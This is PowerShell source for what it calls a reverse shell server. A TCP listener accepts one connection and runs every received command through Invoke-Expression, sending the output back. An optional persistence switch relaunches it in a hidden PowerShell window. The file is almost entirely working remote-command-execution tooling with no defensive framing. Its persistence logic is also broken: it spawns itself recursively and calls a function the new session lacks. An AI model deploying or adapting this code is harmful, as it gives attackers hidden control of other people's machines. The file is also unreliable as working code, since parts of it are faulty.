Function Send-Data {
    <#
    .SYNOPSIS
    Sends data to a remote client over a TCP connection.

    .DESCRIPTION
    This function sends the specified data to a remote client over a TCP connection established using a TcpClient object.

    .PARAMETER Client
    Mandatory - the TcpClient object representing the remote client to send data to.
    .PARAMETER Data
    Mandatory - the data to be sent to the remote client.

    .EXAMPLE
    Send-Data -Client $Client -Data "Hello, client!"

    .NOTES
    v0.0.1
    ** this function is part of a PowerShell-based reverse shell server implementation.
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [System.Net.Sockets.TcpClient]$Client,

        [Parameter(Mandatory = $true)]
        [string]$Data
    )
    $Stream = $Client.GetStream()
    $Writer = [System.IO.StreamWriter]::new($Stream)
    $Writer.WriteLine($Data)
    $Writer.Flush()
}

Function Receive-Data {
    <#
    .SYNOPSIS
    Receives data from a remote client over a TCP connection.

    .DESCRIPTION
    This function reads and returns data received from a remote client over a TCP connection established using a TcpClient object.

    .PARAMETER Client
    Mandatory - TcpClient object representing the remote client from which data is to be received.

    .EXAMPLE
    $ReceivedData = Receive-Data -Client $Client

    .NOTES
    v0.0.1
    ** this function is part of a PowerShell-based reverse shell server implementation.
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [System.Net.Sockets.TcpClient]$Client
    )
    $Stream = $Client.GetStream()
    $Reader = [System.IO.StreamReader]::new($Stream)
    return $Reader.ReadLine()
}

Function Start-ReverseShellServer {
    <#
    .SYNOPSIS
    Starts a reverse shell server to accept incoming connections and execute remote commands.

    .DESCRIPTION
    This function sets up a TCP listener, waits for incoming client connections, and executes commands received from connected clients.It can be used to establish an asynchronous PowerShell remote shell server.

    .PARAMETER Port
    Mandatory - the port number on which the server should listen for incoming connections.
    .PARAMETER Persist
    NotMandatory - if specified, the server will attempt to restart itself if the connection is closed.

    .EXAMPLE
    Start-ReverseShellServer -Port 12345 -Persist

    .NOTES
    v0.0.1
    * use with function Start-ReverseShellClient.
    ** this function is part of a PowerShell-based reverse shell server implementation.
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [int]$Port,

        [Parameter(Mandatory = $false)]
        [switch]$Persist
    )
    Write-Host "ReverseShell - Asynchronous PowerShell Remote Shell (Server Mode)" -ForegroundColor Cyan
    Write-Host "--------------------------------------------------------------" -ForegroundColor Cyan
    if ($Persist) {
        [System.Diagnostics.Process]::Start("powershell.exe", "-WindowStyle Hidden -Command { Start-ReverseShellServer -Port $Port -Persist }")
    }
    $Listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $Port)
    $Listener.Start()
    Write-Host "[+] Waiting for incoming connections..." -ForegroundColor DarkGreen
    $Client = $Listener.AcceptTcpClient()
    $ClientIP = $Client.Client.RemoteEndPoint.Address
    $ClientHost = [System.Net.Dns]::GetHostEntry($ClientIP).HostName
    Write-Host "[+] Client connected from $ClientHost ($ClientIP)" -ForegroundColor Green
    do {
        $Command = Receive-Data -Client $Client
        if ($Command -eq "exit") {
            $Client.Close()
            $Listener.Stop()
            Write-Host "[-] Connection closed by client." -ForegroundColor DarkGray
            break
        }
        $Output = ""
        try {
            $Output = Invoke-Expression $Command 2>&1
        }
        catch {
            $Output = "Error executing command: $($_.Exception.Message)"
        }
        Send-Data -Client $Client -Data $Output
    } while ($null -ne $Command)
}
